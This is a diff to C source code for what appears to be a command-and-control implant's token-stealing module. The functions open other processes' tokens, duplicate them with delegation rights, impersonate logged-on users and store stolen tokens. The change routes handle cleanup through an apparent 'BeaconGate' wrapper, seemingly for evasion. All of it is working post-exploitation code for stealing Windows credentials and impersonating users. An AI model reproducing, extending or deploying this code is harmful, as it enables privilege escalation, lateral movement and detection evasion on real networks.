@@ -2,6 +2,7 @@
  *  Token Stealing Source
  */ 
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include "syscalls.h"
 #include <stdio.h>
 #include <tlhelp32.h>
@@ -49,7 +50,7 @@ void token_guard_stop_maybe(BOOL ignoreToken) {
 void command_rev2self() {
 	/* make the stored token NULL as well */
 	if (atoken)
-		CloseHandle(atoken);
+		gate_CloseHandle(atoken);
 	atoken = NULL;
 	RevertToSelf();
 
@@ -109,12 +110,12 @@ void command_getuid(char * buffer, int length, void(*callback)(char * buffer, in
 	/* try to open thread token */
 	if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &token)) {
 		token_output(token, callback);
-		CloseHandle(token);
+		gate_CloseHandle(token);
 	}
 	/* then process token if that fails */
 	else if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
 		token_output(token, callback);
-		CloseHandle(token);
+		gate_CloseHandle(token);
 	}
 	/* try our stored token, if all else fails... */
 	else if (atoken != NULL) {
@@ -142,17 +143,17 @@ static BOOL steal_token_from_pid(int pid, DWORD access, HANDLE * out_token, char
 	}
 	if (!OpenProcessToken(handle, access, &token)) {
 		post_error_dd(0x24, pid, GetLastError());
-		CloseHandle(handle);
+		gate_CloseHandle(handle);
 		return FALSE;
 	}
 	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &dup)) {
 		post_error_dd(0x26, pid, GetLastError());
-		CloseHandle(token);
-		CloseHandle(handle);
+		gate_CloseHandle(token);
+		gate_CloseHandle(handle);
 		return FALSE;
 	}
-	CloseHandle(token);
-	CloseHandle(handle);
+	gate_CloseHandle(token);
+	gate_CloseHandle(handle);
 	if (name != NULL)
 		token_user(dup, name, nlen);
 	*out_token = dup;
@@ -182,7 +183,7 @@ void command_steal_token(char * buffer, int length, void (*callback)(char * buff
 
 	if (!ImpersonateLoggedOnUser(stolen)) {
 		post_error_dd(0x25, pid, GetLastError());
-		CloseHandle(stolen);
+		gate_CloseHandle(stolen);
 		return;
 	}
 	atoken = stolen;
@@ -245,7 +246,7 @@ static void token_store_drop_slot(token_slot * s) {
 	if (s == NULL || !s->used)
 		return;
 	if (s->token != NULL && s->token != atoken)
-		CloseHandle(s->token);
+		gate_CloseHandle(s->token);
 	memset(s, 0, sizeof(*s));
 }
 
@@ -279,7 +280,7 @@ void command_token_store(char * buffer, int length, void (*callback)(char * buff
 				continue;
 			id = token_store_put(stolen, name);
 			if (id < 0) {
-				CloseHandle(stolen);
+				gate_CloseHandle(stolen);
 				continue;
 			}
 			token_store_format_line(token_store_find(id), line, (int)sizeof(line));
@@ -342,7 +343,7 @@ void command_token_store(char * buffer, int length, void (*callback)(char * buff
 			return;
 		id = token_store_put(stolen, name);
 		if (id < 0) {
-			CloseHandle(stolen);
+			gate_CloseHandle(stolen);
 			return;
 		}
 		command_rev2self();
